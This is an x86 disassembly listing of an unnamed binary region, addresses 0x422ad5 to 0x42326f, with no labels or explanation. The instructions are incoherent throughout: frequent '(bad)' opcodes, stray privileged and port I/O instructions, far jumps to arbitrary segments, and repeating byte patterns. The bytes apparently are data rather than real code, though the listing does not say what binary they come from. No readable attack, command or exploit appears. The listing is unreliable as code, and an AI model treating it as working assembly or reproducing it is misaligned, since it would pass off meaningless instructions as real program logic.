  422ad5:	add    BYTE PTR [ebx+0x0],ah
  422ad8:	add    BYTE PTR [eax],al
  422ada:	or     bh,BYTE PTR [ebp+0x2ebbe94b]
  422ae0:	add    al,ch
  422ae2:	stc    
  422ae3:	mov    esp,0x2f661ecf
  422ae8:	add    DWORD PTR [esi-0x35],ebp
  422aeb:	lods   eax,DWORD PTR ds:[esi]
  422aec:	(bad)  
  422aed:	into   
  422aee:	and    DWORD PTR [ebp-0x52],eax
  422af1:	add    ebp,DWORD PTR [ebx]
  422af3:	es ret 
  422af5:	dec    esp
  422af6:	pusha  
  422af7:	adc    al,BYTE PTR ds:0xca03aa0a
  422afd:	cmc    
  422afe:	pop    ebx
  422aff:	stc    
  422b00:	mov    ah,0x24
  422b02:	sbb    eax,0x3eedaf7b
  422b07:	(bad)  
  422b08:	push   cs
  422b09:	fcmovbe st,st(1)
  422b0b:	rcl    DWORD PTR [edx],cl
  422b0d:	std    
  422b0e:	out    dx,al
  422b0f:	push   0xbb806610
  422b14:	mov    BYTE PTR [ecx+0x2588689],bl
  422b1a:	pop    edx
  422b1b:	mov    al,ds:0x5655f98
  422b20:	add    DWORD PTR [ebx-0x718b4e1b],esp
  422b26:	fcomi  st,st(2)
  422b28:	cmc    
  422b29:	dec    ebx
  422b2a:	fs mul si
  422b2e:	jbe    0x422ae4
  422b30:	mov    eax,ds:0x18721ced
  422b35:	mov    bh,0x48
  422b37:	in     eax,dx
  422b38:	pop    ebx
  422b39:	clc    
  422b3a:	repnz add al,0x6f
  422b3d:	add    BYTE PTR [eax],al
  422b3f:	add    BYTE PTR [eax],al
  422b41:	add    BYTE PTR [eax+0x23],dh
  422b44:	and    eax,0x7c6f7769
  422b49:	cmp    esp,DWORD PTR [eax-0x684311e4]
  422b4f:	(bad)  
  422b51:	xchg   ebp,eax
  422b52:	sbb    edx,edx
  422b54:	add    DWORD PTR [eax],eax
  422b56:	arpl   WORD PTR [eax],ax
  422b58:	add    BYTE PTR [eax],al
  422b5a:	xor    al,0x83
  422b5c:	or     DWORD PTR [esi-0x121f0bdc],esp
  422b62:	outs   dx,BYTE PTR ds:[esi]
  422b63:	std    
  422b64:	mov    eax,0xf7db4372
  422b69:	sub    al,0x77
  422b6b:	mov    ?,WORD PTR [eax-0x4a]
  422b6e:	add    DWORD PTR [ecx+0x1f8be611],ebp
  422b74:	pusha  
  422b75:	bndldx (bad),[ebx-0x33]
  422b79:	jae    0x422b32
  422b7b:	dec    ecx
  422b7c:	sub    DWORD PTR [ebp-0x44307ec6],ebx
  422b82:	xchg   ebx,eax
  422b84:	in     al,0x1a
  422b86:	dec    ebx
  422b87:	cmc    
  422b88:	cs push ss
  422b8a:	fs pop esi
  422b8c:	lea    ecx,[edi]
  422b8e:	in     al,dx
  422b8f:	test   al,0x46
  422b91:	mov    ds:0x90d07746,eax
  422b96:	cmp    al,0xaa
  422b98:	mov    bl,0xa6
  422b9a:	and    al,0x5a
  422b9c:	mov    ds:0x29150062,eax
  422ba1:	ins    DWORD PTR es:[edi],dx
  422ba2:	daa    
  422ba3:	enter  0x1e73,0xc7
  422ba7:	stos   DWORD PTR es:[edi],eax
  422ba8:	inc    BYTE PTR ss:[edx-0x45]
  422bac:	mov    eax,es
  422bae:	popf   
  422baf:	ret    0xa91a
  422bb2:	push   edx
  422bb3:	xor    DWORD PTR [eax-0x23a0e2f7],edx
  422bb9:	jmp    0xfad83c
  422bbe:	add    BYTE PTR [eax],al
  422bc0:	add    BYTE PTR [eax],al
  422bc2:	xchg   esp,eax
  422bc3:	nop
  422bc4:	ffree  st(0)
  422bc6:	(bad)  
  422bc8:	popf   
  422bc9:	aam    0x57
  422bcb:	(bad)
  422bcf:	and    BYTE PTR [edx],0x30
  422bd2:	jle    0x422ba6
  422bd4:	add    DWORD PTR [eax],eax
  422bd6:	arpl   WORD PTR [eax],ax
  422bd8:	add    BYTE PTR [eax],al
  422bda:	(bad)  
  422bdb:	mov    di,0xb15e
  422bdf:	lods   al,BYTE PTR ds:[esi]
  422be0:	cli    
  422be1:	lahf   
  422be2:	test   DWORD PTR [esi-0x5237cb81],0x8e9258db
  422bec:	mov    edx,0xea95d9c0
  422bf1:	icebp  
  422bf2:	mov    al,0x56
  422bf4:	ins    BYTE PTR es:[edi],dx
  422bf5:	or     al,0x22
  422bf7:	fucomi st,st(2)
  422bf9:	inc    esi
  422bfa:	ret    
  422bfb:	jb     0x422c16
  422bfd:	test   BYTE PTR [ebx+0x10],bl
  422c00:	add    edx,DWORD PTR [ebp+0x44]
  422c03:	into   
  422c04:	call   0x7e3a55e2
  422c09:	shl    ebx,0x26
  422c0c:	leave  
  422c0d:	adc    al,BYTE PTR [ebx]
  422c0f:	repz fs adc esp,edi
  422c13:	rol    BYTE PTR [ebx+0x27],0x60
  422c17:	pushf  
  422c18:	push   ebx
  422c19:	add    ch,BYTE PTR [esi]
  422c1b:	hlt    
  422c1c:	test   al,0x53
  422c1e:	push   esi
  422c1f:	ds adc bx,bx
  422c23:	dec    edi
  422c24:	addr16 into 
  422c26:	jno    0x422c9d
  422c28:	into   
  422c29:	ficomp DWORD PTR [eax]
  422c2b:	(bad)  
  422c2c:	out    dx,al
  422c2d:	jno    0x422c49
  422c2f:	mov    ch,0xba
  422c31:	arpl   ax,si
  422c33:	test   DWORD PTR [eax+0x60],0x7d8344c2
  422c3a:	mov    edi,0x1827
  422c3f:	add    BYTE PTR [eax],al
  422c41:	add    ah,dh
  422c43:	mov    dl,0x32
  422c45:	(bad)  
  422c46:	jbe    0x422c1e
  422c48:	hlt    
  422c49:	mov    dl,0xb1
  422c4b:	and    al,0xfe
  422c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4e:	call   0x1d2:0xe1a98191
  422c55:	add    BYTE PTR [ebx+0x0],ah
  422c58:	add    BYTE PTR [eax],al
  422c5a:	mov    DWORD PTR [esi+0x17e1953e],edx
  422c60:	adc    edx,edx
  422c62:	pushf  
  422c63:	xchg   esi,eax
  422c64:	jmp    0x422c6c
  422c66:	cli    
  422c67:	je     0x422caa
  422c69:	inc    ebx
  422c6a:	sub    BYTE PTR [eax+0x12],ch
  422c6d:	dec    edx
  422c6e:	push   0x80686e05
  422c73:	inc    eax
  422c74:	jle    0x422c85
  422c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c77:	pop    esp
  422c78:	add    bl,cl
  422c7a:	imul   ebp,DWORD PTR [ecx],0x297b3566
  422c80:	test   DWORD PTR [edx-0x37],esi
  422c83:	loop   0x422cf7
  422c85:	jecxz  0x422c6c
  422c87:	push   es
  422c88:	xchg   ecx,eax
  422c89:	int3   
  422c8a:	push   es
  422c8b:	or     dh,BYTE PTR [esi+0x5903313d]
  422c91:	shr    DWORD PTR [eax],cl
  422c93:	xor    al,0x61
  422c95:	dec    ecx
  422c96:	fadd   DWORD PTR ds:0x926530b
  422c9c:	mov    esi,0x15d7913b
  422ca1:	sbb    BYTE PTR [edx],dh
  422ca3:	mov    WORD PTR [eax],?
  422ca5:	xor    DWORD PTR [eax],eax
  422ca7:	ins    BYTE PTR es:[edi],dx
  422ca8:	jno    0x422d10
  422caa:	mov    cl,0xc5
  422cac:	cdq    
  422cad:	jno    0x422d1d
  422caf:	mov    edi,0xd9ff6874
  422cb4:	in     al,0xc
  422cb6:	pop    es
  422cb7:	or     DWORD PTR [ebx+eiz*8],eax
  422cba:	loop   0x422c9d
  422cbc:	jge    0x422cbe
  422cbe:	add    BYTE PTR [eax],al
  422cc0:	add    BYTE PTR [eax],al
  422cc2:	xor    dl,bl
  422cc4:	into   
  422cc5:	mov    ds:0xd37ebfef,al
  422cca:	sub    edi,DWORD PTR [esi]
  422ccc:	out    0x3f,eax
  422cce:	(bad)  
  422cd0:	xor    BYTE PTR [esi],bl
  422cd2:	inc    esp
  422cd3:	rol    DWORD PTR [ecx],cl
  422cd5:	add    BYTE PTR [ebx+0x0],ah
  422cd8:	add    BYTE PTR [eax],al
  422cda:	pop    ds
  422cdb:	fnsave [edx+0x31]
  422cde:	scas   eax,DWORD PTR es:[edi]
  422cdf:	mov    al,0x40
  422ce1:	mov    bh,0x21
  422ce3:	jns    0x422c8e
  422ce5:	adc    al,0xb
  422ce7:	push   ebx
  422ce8:	cld    
  422ce9:	xor    eax,0x6a4bad2d
  422cee:	pop    ss
  422cef:	test   dh,bh
  422cf1:	inc    esp
  422cf2:	xor    al,0xd1
  422cf4:	fstp   TBYTE PTR [ebp+0x21eb13b3]
  422cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cfb:	dec    ecx
  422cfc:	cdq    
  422cfd:	dec    ebp
  422cfe:	pop    ebx
  422cff:	push   ebp
  422d00:	or     bh,BYTE PTR [esi]
  422d02:	dec    ebp
  422d03:	inc    ebx
  422d04:	pushf  
  422d05:	shl    BYTE PTR [edx-0x25],cl
  422d08:	dec    eax
  422d09:	(bad)  
  422d0a:	stos   BYTE PTR es:[edi],al
  422d0b:	call   0xcb9a:0xd4012fbc
  422d12:	jno    0x422ce0
  422d14:	push   edi
  422d15:	into   
  422d16:	add    al,0x8f
  422d18:	lahf   
  422d19:	push   ds
  422d1a:	pop    ecx
  422d1b:	inc    esi
  422d1c:	inc    edx
  422d1d:	mov    DWORD PTR [eax+0x3d33a993],ebx
  422d23:	push   edx
  422d24:	xchg   DWORD PTR [edi-0x4d4e7ad6],esi
  422d2a:	inc    eax
  422d2b:	mov    ebp,0x9eb54ec5
  422d30:	in     al,dx
  422d31:	mov    al,ds:0x3f683196
  422d36:	cmp    al,0x4
  422d38:	mov    bl,0x96
  422d3a:	and    DWORD PTR [ebx+0xb7],edi
  422d40:	add    BYTE PTR [eax],al
  422d42:	fucomi st,st(5)
  422d44:	outs   dx,BYTE PTR ds:[esi]
  422d45:	and    bh,BYTE PTR [esi-0x5d]
  422d48:	(bad)  
  422d4a:	pop    esi
  422d4b:	(bad)  
  422d4c:	mov    DWORD PTR [ebp-0x1b417546],ecx
  422d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d53:	rol    DWORD PTR [ecx],cl
  422d55:	add    BYTE PTR [ebx+0x0],ah
  422d58:	add    BYTE PTR [eax],al
  422d5a:	jb     0x422d0f
  422d5c:	mov    ds:0x58631dcf,al
  422d61:	adc    al,0xe8
  422d63:	inc    edx
  422d64:	inc    esi
  422d65:	aam    0x6b
  422d67:	inc    ebp
  422d68:	xchg   esi,eax
  422d69:	sbb    eax,0xfc90f649
  422d6e:	imul   edi,DWORD PTR [esp+ecx*1],0x4b
  422d72:	pop    ebx
  422d73:	sub    DWORD PTR [edx+edi*1-0xd],0x57
  422d78:	sahf   
  422d79:	not    BYTE PTR [esi+0x6]
  422d7c:	mov    ebp,0xee91724d
  422d81:	mov    cl,0x3a
  422d83:	jae    0x422d28
  422d85:	loope  0x422da3
  422d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d88:	mov    ebp,0x6aff2ac3
  422d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d8e:	xlat   BYTE PTR ds:[ebx]
  422d8f:	popf   
  422d90:	dec    ebx
  422d91:	jl     0x422dcf
  422d93:	pop    esi
  422d94:	xor    BYTE PTR [edi-0x5b],dl
  422d97:	stos   BYTE PTR es:[edi],al
  422d98:	cdq    
  422d99:	repz mov eax,ds:0xe813d722
  422d9f:	in     eax,0x67
  422da1:	hlt    
  422da2:	or     DWORD PTR [esi+0x6920ed93],edx
  422da8:	xchg   DWORD PTR [esi-0x5d421ad9],ebp
  422dae:	mov    bh,0xa7
  422db0:	add    BYTE PTR [esi],al
  422db2:	test   eax,0xb37ce513
  422db7:	sbb    BYTE PTR es:[ebp+edi*4+0x74d0],ch
  422dbf:	add    BYTE PTR [eax],al
  422dc1:	add    BYTE PTR ds:0x6f976b22,al
  422dc7:	(bad)  
  422dc9:	mov    dl,0x66
  422dcb:	and    BYTE PTR [esi+0x1a12776a],ah
  422dd1:	and    BYTE PTR [edx],cl
  422dd3:	aam    0x1
  422dd5:	add    BYTE PTR [ebx+0x0],ah
  422dd8:	add    BYTE PTR [eax],al
  422dda:	xor    eax,0xfb580c61
  422ddf:	retf   0xa677
  422de2:	push   esp
  422de3:	mov    al,ds:0xb871f333
  422de8:	jbe    0x422d7e
  422dea:	sbb    ch,dl
  422dec:	inc    edx
  422ded:	mov    ebp,0x52c7a222
  422df2:	aas    
  422df3:	xor    al,0xf
  422df5:	jb     0x422dba
  422df7:	mov    bh,ah
  422df9:	sub    ecx,ebx
  422dfb:	mov    ebp,0xd5026343
  422e00:	mov    BYTE PTR [esi],dh
  422e02:	out    0x5d,al
  422e04:	push   eax
  422e05:	bsf    ebx,ebp
  422e08:	mov    ch,0x9f
  422e0a:	dec    ebp
  422e0b:	jb     0x422e0e
  422e0d:	jno    0x422e89
  422e0f:	adc    ch,ah
  422e11:	add    al,0xc7
  422e13:	push   0x47909e6a
  422e18:	into   
  422e19:	mov    al,0x9d
  422e1b:	dec    esp
  422e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e1d:	aad    0xe8
  422e1f:	or     DWORD PTR [ebx],edi
  422e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e22:	fcom   st(4)
  422e24:	imul   edi,esp,0x99c2a971
  422e2a:	inc    esp
  422e2b:	jbe    0x422df6
  422e2d:	sbb    ebp,DWORD PTR [edi+0x36ae5066]
  422e33:	fcmovnb st,st(0)
  422e35:	popf   
  422e36:	into   
  422e37:	lods   al,BYTE PTR ds:[esi]
  422e38:	push   ebx
  422e39:	aaa    
  422e3a:	cmc    
  422e3b:	xchg   ebx,eax
  422e3c:	ins    BYTE PTR es:[edi],dx
  422e3d:	add    BYTE PTR [eax],al
  422e3f:	add    BYTE PTR [eax],al
  422e41:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e47:	stc    
  422e48:	call   esi
  422e4a:	into   
  422e4b:	inc    ebp
  422e4c:	mov    bh,0x11
  422e4e:	inc    eax
  422e4f:	xchg   ebx,eax
  422e50:	mov    esi,0x1d46df0
  422e55:	add    BYTE PTR [ebx+0x0],ah
  422e58:	add    BYTE PTR [eax],al
  422e5a:	mov    edi,0x5a6b91bf
  422e5f:	mov    al,ds:0xc71fdbcb
  422e64:	add    eax,0x6b281d34
  422e69:	fst    QWORD PTR [eax-0x46]
  422e6c:	out    dx,al
  422e6d:	xchg   esi,eax
  422e6e:	inc    ebp
  422e6f:	popf   
  422e70:	sbb    eax,0x8921b939
  422e75:	imul   ax,si,0x61e9
  422e7a:	sbb    cl,dh
  422e7c:	cli    
  422e7d:	or     al,0xe8
  422e7f:	adc    cl,BYTE PTR [ebp-0x7a941196]
  422e85:	lea    esi,[ebx-0x65b5d3ce]
  422e8b:	and    DWORD PTR [edi-0x73],0xffffffc4
  422e8f:	aaa    
  422e90:	push   0xd98c38c8
  422e95:	push   esp
  422e96:	jns    0x422e8e
  422e98:	jge    0x422e8c
  422e9a:	sbb    ebx,DWORD PTR [edx+0x3f79d556]
  422ea0:	lods   al,BYTE PTR ds:[esi]
  422ea1:	inc    edi
  422ea2:	cmp    cl,al
  422ea4:	inc    esp
  422ea5:	or     BYTE PTR [eax+esi*4+0x2595b811],ch
  422eac:	jns    0x422ee2
  422eae:	xor    ebx,DWORD PTR [ecx+0x3ffff845]
  422eb4:	sub    ah,ch
  422eb6:	(bad)  
  422eb7:	iret   
  422eb8:	(bad)  
  422eb9:	shr    BYTE PTR [ebp+0x5389],0x0
  422ec0:	add    BYTE PTR [eax],al
  422ec2:	fisubr WORD PTR [ecx]
  422ec4:	cwde   
  422ec5:	sar    bh,cl
  422ec7:	repz fisubr WORD PTR ds:0x4af35f6
  422ece:	jmp    0x422e84
  422ed0:	xor    cl,BYTE PTR [ecx+0x1d4d0]
  422ed6:	arpl   WORD PTR [eax],ax
  422ed8:	add    BYTE PTR [eax],al
  422eda:	enter  0xfc53,0x97
  422ede:	and    esp,ebp
  422ee0:	mov    eax,ds:0xf37c24fa
  422ee5:	mov    esp,0xa554ea42
  422eea:	push   edi
  422eeb:	scas   al,BYTE PTR es:[edi]
  422eec:	in     al,dx
  422eed:	jne    0x422f19
  422eef:	xchg   DWORD PTR [edx+0xe],ebp
  422ef2:	push   esp
  422ef3:	cmp    eax,0xecb6b489
  422ef8:	sbb    DWORD PTR [eax+ebp*4-0x5519bab9],ecx
  422eff:	sbb    DWORD PTR [ebx-0x40],esi
  422f02:	push   cs
  422f03:	les    esi,FWORD PTR [edx-0x79]
  422f06:	outs   dx,BYTE PTR ds:[esi]
  422f07:	xchg   ecx,eax
  422f08:	push   cs
  422f09:	dec    eax
  422f0a:	and    eax,DWORD PTR [ebp+0x5f008c6f]
  422f10:	arpl   ax,bx
  422f12:	shl    ebx,cl
  422f14:	mov    eax,ds:0xbcd2026d
  422f19:	pop    ebp
  422f1a:	mov    dh,0xe
  422f1c:	sbb    BYTE PTR [edi+0x79],0x8c
  422f20:	rcl    esp,0x8c
  422f23:	jne    0x422edc
  422f25:	xchg   edi,eax
  422f26:	popa   
  422f27:	jae    0x422ee2
  422f29:	loop   0x422f1c
  422f2b:	and    BYTE PTR [esi],0x64
  422f2e:	jne    0x422ed4
  422f30:	out    0x31,al
  422f32:	inc    esi
  422f33:	call   0x635a:0xf62c4a14
  422f3a:	add    al,cl
  422f3c:	push   0x0
  422f3e:	add    BYTE PTR [eax],al
  422f40:	add    BYTE PTR [eax],al
  422f42:	dec    esi
  422f43:	aas    
  422f44:	int3   
  422f45:	sbb    eax,0x7fdffffd
  422f4a:	out    dx,eax
  422f4b:	loopne 0x422f63
  422f4d:	lods   al,BYTE PTR ds:[esi]
  422f4e:	pop    esp
  422f4f:	xor    eax,0xd5339a33
  422f54:	add    DWORD PTR [eax],eax
  422f56:	arpl   WORD PTR [eax],ax
  422f58:	add    BYTE PTR [eax],al
  422f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f5b:	xchg   esi,eax
  422f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f5d:	or     bl,al
  422f5f:	adc    BYTE PTR [eax-0x3a],cl
  422f62:	fdivp  st(0),st
  422f64:	and    al,0xd0
  422f66:	jne    0x422f75
  422f68:	jp     0x422fd6
  422f6a:	test   DWORD PTR [esi+0x17],0xa06eb307
  422f71:	rcr    DWORD PTR [ebx-0x43f624e8],0xda
  422f78:	call   0x7538:0x2603162b
  422f7f:	scas   al,BYTE PTR es:[edi]
  422f80:	pop    eax
  422f81:	mov    dl,0x31
  422f83:	and    eax,0x2a52495b
  422f88:	aas    
  422f89:	and    al,0x5e
  422f8b:	mov    bl,0x6f
  422f8d:	jbe    0x42300a
  422f8f:	sbb    edi,DWORD PTR [edx-0x77bc2d8e]
  422f95:	popf   
  422f96:	sahf   
  422f97:	rcr    DWORD PTR [esi+0x26e17f6c],0xbe
  422f9e:	sub    al,0xe7
  422fa0:	(bad)  
  422fa1:	(bad)  
  422fa3:	pop    edx
  422fa4:	xor    ch,BYTE PTR [eax]
  422fa6:	jmp    0x422f2a
  422fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fa9:	scas   al,BYTE PTR es:[edi]
  422faa:	sub    BYTE PTR [ebx+0x21],0x6e
  422fae:	div    BYTE PTR [edx]
  422fb0:	inc    ecx
  422fb1:	lock aas 
  422fb3:	dec    edx
  422fb4:	dec    esi
  422fb5:	pop    ss
  422fb6:	push   esi
  422fb7:	jnp    0x422fa2
  422fb9:	fst    DWORD PTR [ebp+ecx*8+0x47]
  422fc0:	add    BYTE PTR [eax],al
  422fc2:	push   ds
  422fc3:	test   eax,0x7ff735f6
  422fc8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fce:	popa   
  422fcf:	stc    
  422fd0:	(bad)  
  422fd1:	hlt    
  422fd2:	xchg   esi,eax
  422fd3:	aad    0x1
  422fd5:	add    BYTE PTR [ebx+0x0],ah
  422fd8:	add    BYTE PTR [eax],al
  422fda:	or     DWORD PTR [eax],eax
  422fdc:	shl    DWORD PTR [ebx+ebp*8],cl
  422fdf:	mov    edx,0x5d353d18
  422fe4:	adc    eax,0x94228847
  422fe9:	test   DWORD PTR [ebp+ebx*1-0x9],0xf397ad77
  422ff1:	leave  
  422ff2:	sbb    cl,dl
  422ff4:	cmp    dh,ah
  422ff6:	fdiv   QWORD PTR [ebx+ebp*8+0x13]
  422ffa:	and    eax,0x78d74ab4
  422fff:	mov    ah,0xcf
  423001:	jmp    0x6a1f:0x71a0d81b
  423008:	xor    ebp,DWORD PTR [ecx-0x6499b451]
  42300e:	xchg   edx,eax
  42300f:	mov    ecx,0x3737cb69
  423014:	(bad)  
  423015:	in     eax,dx
  423016:	fwait
  423017:	(bad)  
  423018:	xchg   ebx,eax
  423019:	jle    0x423013
  42301b:	push   eax
  42301c:	fstp   DWORD PTR [edx+0x17]
  42301f:	cld    
  423020:	scas   al,BYTE PTR es:[edi]
  423021:	mov    ds:0xe91f11f8,al
  423026:	push   ebp
  423027:	adc    BYTE PTR [ecx],bh
  423029:	xor    al,0x7e
  42302b:	xor    esi,ebx
  42302d:	fst    QWORD PTR [eax]
  42302f:	inc    edx
  423030:	nop
  423031:	jmp    0x48a:0xa3a759b8
  423038:	(bad)
  42303b:	and    eax,0xad
  423040:	add    BYTE PTR [eax],al
  423042:	fwait
  423043:	loope  0x4230b2
  423045:	sub    eax,0xf7dbad7f
  42304a:	sar    BYTE PTR [ebx],cl
  42304c:	(bad)  
  42304d:	add    BYTE PTR [edi-0x79],bh
  423050:	cmp    esi,DWORD PTR [edi-0x7]
  423053:	aad    0x1
  423055:	add    BYTE PTR [ebx+0x0],ah
  423058:	add    BYTE PTR [eax],al
  42305a:	nop
  42305b:	sub    esi,DWORD PTR [ebx-0x1b66ffb9]
  423061:	jae    0x423037
  423063:	mov    al,0xb9
  423065:	cmc    
  423066:	leave  
  423067:	add    BYTE PTR [esi-0x5c17b862],0x3c
  42306e:	call   0x3d1b2947
  423073:	bound  esi,QWORD PTR [eax+edx*8]
  423076:	mov    edi,0xb12e1fdb
  42307b:	adc    esp,DWORD PTR [edi+0x368bceee]
  423081:	mov    ds:0x31243510,al
  423086:	stos   BYTE PTR es:[edi],al
  423087:	add    al,0x8a
  423089:	cdq    
  42308a:	pushf  
  42308b:	out    0x40,al
  42308d:	cmp    al,0xaf
  42308f:	leave  
  423090:	(bad)  
  423091:	jmp    DWORD PTR [eax+0x43f4c047]
  423097:	push   ecx
  423098:	enter  0x765c,0xcf
  42309c:	cmp    ah,BYTE PTR [esi]
  42309e:	push   cs
  42309f:	into   
  4230a0:	dec    esi
  4230a1:	or     DWORD PTR [ecx-0x6b],0xffffffef
  4230a5:	popa   
  4230a6:	test   eax,0xe3cc24f
  4230ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230ac:	ins    BYTE PTR es:[edi],dx
  4230ad:	jo     0x42307a
  4230af:	lods   eax,DWORD PTR ds:[esi]
  4230b0:	xchg   ebp,eax
  4230b1:	mov    dl,0x58
  4230b3:	lods   al,BYTE PTR ds:[esi]
  4230b4:	ins    DWORD PTR es:[edi],dx
  4230b5:	aaa    
  4230b6:	xor    BYTE PTR [ebp-0x71522677],bl
  4230bc:	test   BYTE PTR [eax],al
  4230be:	add    BYTE PTR [eax],al
  4230c0:	add    BYTE PTR [eax],al
  4230c2:	or     bh,dh
  4230c4:	ja     0x423110
  4230c6:	dec    edx
  4230c8:	cmp    eax,0x2e8eedf7
  4230cd:	dec    eax
  4230ce:	fs add eax,edx
  4230d1:	or     bl,BYTE PTR [esi+edx*8+0x1]
  4230d5:	add    BYTE PTR [ebx+0x0],ah
  4230d8:	add    BYTE PTR [eax],al
  4230da:	mov    cl,0xf9
  4230dc:	mov    dl,0x25
  4230de:	pop    ss
  4230df:	add    bh,ah
  4230e1:	test   BYTE PTR [ebx],al
  4230e3:	jmp    0xb1c14746
  4230e8:	mov    eax,0xe493dfd8
  4230ed:	mov    DWORD PTR [ebx+0x7b1cc87c],ebp
  4230f3:	jmp    0xf7ca5cda
  4230f8:	or     eax,0x96fa2170
  4230fd:	sbb    edx,DWORD PTR [edi-0x1104cd39]
  423103:	sbb    DWORD PTR [edx+0x7c],ebp
  423106:	fadd   st,st(1)
  423108:	jno    0x4230d3
  42310a:	or     al,0x24
  42310c:	xchg   ebx,eax
  42310d:	pop    edi
  42310e:	ins    BYTE PTR es:[edi],dx
  42310f:	lods   eax,DWORD PTR ds:[esi]
  423110:	(bad)  
  423111:	xchg   esi,eax
  423112:	push   ebx
  423113:	fs or  ecx,edi
  423116:	lock lock fst DWORD PTR [esi+0x5a9aa43b]
  42311e:	push   cs
  42311f:	lock inc eax
  423121:	jmp    0x721b22b0
  423126:	sub    al,0x30
  423128:	xor    eax,edx
  42312a:	sti    
  42312b:	nop
  42312c:	pop    es
  42312d:	in     eax,0x40
  42312f:	nop
  423130:	push   edx
  423131:	out    0xf8,eax
  423133:	ror    cl,1
  423135:	data16 or ah,BYTE PTR [ecx+0x1d]
  423139:	jecxz  0x423190
  42313b:	cmp    esp,DWORD PTR [edx]
  42313d:	add    BYTE PTR [eax],al
  42313f:	add    BYTE PTR [eax],al
  423141:	add    BYTE PTR [esi],dh
  423143:	arpl   WORD PTR [eax-0x10],bp
  423146:	jge    0x423143
  423148:	mov    esi,0x8c7853e7
  42314d:	daa    
  42314e:	pushf  
  42314f:	cwde   
  423150:	pop    esp
  423151:	sbb    eax,0x1d6bf
  423156:	arpl   WORD PTR [eax],ax
  423158:	add    BYTE PTR [eax],al
  42315a:	pop    ebp
  42315b:	push   ebx
  42315c:	fwait
  42315d:	sbb    bh,BYTE PTR [esi]
  42315f:	or     ch,bh
  423161:	je     0x42316a
  423163:	daa    
  423164:	outs   dx,BYTE PTR ds:[esi]
  423165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423166:	loop   0x4231ac
  423168:	pop    esi
  423169:	pop    ds
  42316a:	xor    edi,edi
  42316c:	push   edx
  42316d:	mov    edi,0x70bd3f18
  423172:	inc    eax
  423173:	sahf   
  423174:	sbb    eax,0x209cc7ec
  423179:	jecxz  0x42317c
  42317b:	xchg   esp,eax
  42317c:	bnd jmp 0x4231c2
  42317f:	rcl    DWORD PTR [edx],1
  423181:	mov    ecx,DWORD PTR [edx]
  423183:	sbb    DWORD PTR [ecx-0x1bedd366],ecx
  423189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42318a:	shl    BYTE PTR [ecx],0x42
  42318d:	push   0x38
  42318f:	into   
  423190:	pop    ebp
  423191:	les    ebx,FWORD PTR [eax]
  423193:	popa   
  423194:	nop
  423195:	mov    cl,0x67
  423197:	jns    0x423210
  423199:	sahf   
  42319a:	ret    0x3021
  42319d:	das    
  42319e:	fs jnp 0x42318a
  4231a1:	fscale 
  4231a3:	push   edi
  4231a4:	dec    edi
  4231a5:	aas    
  4231a6:	inc    esp
  4231a7:	xor    BYTE PTR [edi+0xd3d1be4],ch
  4231ad:	push   cs
  4231ae:	mov    bh,0x5a
  4231b0:	pushf  
  4231b1:	xchg   edx,eax
  4231b2:	adc    esi,DWORD PTR [edi]
  4231b4:	inc    esi
  4231b5:	cli    
  4231b6:	iret   
  4231b7:	mov    cl,0x9e
  4231b9:	and    DWORD PTR [ebp-0x1a],0x92
  4231c0:	add    BYTE PTR [eax],al
  4231c2:	daa    
  4231c3:	push   ecx
  4231c4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231ce:	cmp    cl,ah
  4231d0:	test   al,0x39
  4231d2:	sbb    dh,bl
  4231d4:	add    DWORD PTR [eax],eax
  4231d6:	arpl   WORD PTR [eax],ax
  4231d8:	add    BYTE PTR [eax],al
  4231da:	mov    eax,ds:0x4f20e676
  4231df:	mov    eax,0xb520fa45
  4231e4:	cmp    al,0xee
  4231e6:	mov    ebx,0x30f8b5e7
  4231eb:	pop    ss
  4231ec:	aam    0xdd
  4231ee:	clc    
  4231ef:	mov    bh,0x72
  4231f1:	dec    ebx
  4231f2:	loop   0x42325a
  4231f4:	popa   
  4231f5:	add    al,0xd7
  4231f7:	lahf   
  4231f8:	popa   
  4231f9:	nop
  4231fa:	into   
  4231fb:	test   al,0xbf
  4231fd:	sub    eax,0xd9d0388e
  423202:	mov    ebx,0x2693394d
  423207:	mov    eax,0x2f787ab5
  42320c:	arpl   WORD PTR [esi+0x238ad620],bx
  423212:	daa    
  423213:	sub    DWORD PTR [ecx-0x5e],0x6dbf2523
  42321a:	cmc    
  42321b:	xor    esp,edx
  42321d:	aas    
  42321e:	and    BYTE PTR [edi],al
  423220:	pop    edx
  423221:	ret    
  423222:	(bad)  
  423223:	enter  0x1815,0xf2
  423227:	adc    dh,BYTE PTR [edi]
  423229:	mov    ds,WORD PTR [esi+esi*2+0x61bc0454]
  423230:	dec    ebp
  423231:	shr    DWORD PTR [ebp+0x6c],1
  423234:	sub    eax,0x1ad8958f
  423239:	mov    dl,0xa6
  42323b:	dec    ebx
  42323c:	and    al,0x0
  42323e:	add    BYTE PTR [eax],al
  423240:	add    BYTE PTR [eax],al
  423242:	daa    
  423243:	ss lahf 
  423245:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42324b:	and    eax,0xf1be075b
  423250:	sub    BYTE PTR [ecx+0x7b],0xde
  423254:	add    DWORD PTR [eax],eax
  423256:	arpl   WORD PTR [eax],ax
  423258:	add    BYTE PTR [eax],al
  42325a:	or     bl,BYTE PTR [ecx-0x11]
  42325d:	lea    edx,[ebx+0x1f91e61c]
  423263:	das    
  423264:	cmc    
  423265:	sub    eax,0x9e80088
  42326a:	and    eax,0xbb85ef59
  42326f:	mov    dl,0x45
